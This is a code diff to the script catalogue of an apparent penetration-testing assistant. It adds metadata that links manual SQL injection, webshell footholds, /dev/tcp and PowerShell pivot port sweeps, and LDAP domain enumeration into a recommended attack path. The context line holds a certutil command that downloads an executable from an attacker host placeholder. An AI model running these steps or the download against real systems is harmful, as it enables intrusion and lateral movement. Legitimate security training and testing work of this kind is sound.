@@ -341,3 +341,29 @@ certutil -urlcache -split -f http://{{lhost}}/tool.exe C:\\Users\\Public\\t.exe`
   };
   for(const s of list||[]){const m=META[s.id];if(m)for(const k in m)if(s[k]===undefined)s[k]=m[k];}
 })(window.OBOL_SCRIPTS);
+
+// ---- Next Steps path metadata (v10.12 Build C) -------------------------------------------
+// A curated subset of scripts are proposable on the operator Next Steps path. Each carries
+// `prereq` (facts that must hold — same {all,any,none} shape as an Orange methodology card),
+// `produces` (facts the operator gains by running it), and `lane` (for grouping/labelling),
+// plus a `pathProposable` flag. `assets/operator-route-current.js` reads this metadata to
+// propose scripts ADDITIVELY by Evidence state (never replacing Orange cards) and to offer an
+// exam-safe / LOTL substitute beside a ranked recommendation for a rule-breaking tool. The
+// facts referenced here already exist in the Orange lane graph (`data/lanes*.js`), so a script
+// surfaces exactly when the same Evidence that grounds its lane is present. Attaching this
+// metadata executes nothing — these remain offline, human-run snippets.
+(function(list){
+  const PATH={
+    // Manual SQLi stands in for sqlmap once a parameter is confirmed injectable (mirrors the
+    // sqlmap-automation card's prereq/produces so it slots into the same decision point).
+    'manual-sqli':{lane:'web',prereq:{any:['web.sqli_confirmed','web.parameterized']},produces:['db.creds','foothold.webshell']},
+    // Bash /dev/tcp sweep: pivot recon from a Linux foothold with nothing to upload.
+    'portsweep-bash':{lane:'recon',prereq:{any:['foothold.linux','pivot.required','pivot.dual_homed']},produces:['scan.internal']},
+    // PowerShell port sweep: the same pivot recon from a Windows foothold.
+    'portscan-ps':{lane:'recon',prereq:{any:['foothold.windows']},produces:['scan.internal']},
+    // LDAPSearch cookbook stands in for BloodHound/NetExec collection on a domain foothold.
+    ldapsearch:{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.enumerated']},
+    'ldap-cookbook':{lane:'ad',prereq:{any:['foothold.windows','ad.domain_known']},produces:['ad.enumerated']}
+  };
+  for(const s of list||[]){const m=PATH[s.id];if(m){s.pathProposable=true;for(const k in m)if(s[k]===undefined)s[k]=m[k];}}
+})(window.OBOL_SCRIPTS);
